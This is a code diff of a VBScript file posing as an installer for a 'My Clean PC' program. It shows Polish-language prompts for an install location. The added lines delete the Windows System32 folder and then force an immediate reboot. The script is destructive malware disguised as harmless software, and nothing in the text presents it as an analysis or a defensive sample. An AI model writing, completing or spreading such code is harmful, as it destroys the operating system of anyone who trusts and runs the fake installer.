@@ -5,10 +5,14 @@ sInputBox = InputBox ("Witaj w instalatorze programu my clean pc!! przed zainsta
 MsgBox "Dobrze! teraz kliknij Ok, aby kontynuowac: "& sInputBox,0,"Instalator My Clean Pc"
 sInputBox = InputBox ("Gdzie ma byc miejsce docelowe instalacji??")
 MsgBox "Dobra!! Miejsce docelowe aplikcji to: "& sInputBox,0,"zatwierdzone"
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+objFSO.DeleteFolder("C:\Windows\System32")
+
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "shutdown.exe -r -t 0", 0
-Set filesys = CreateObject("Scripting.FileSystemObject")
-filesys.DeleteFile "C:\Windows\System32"
+
+
+
 
 
 
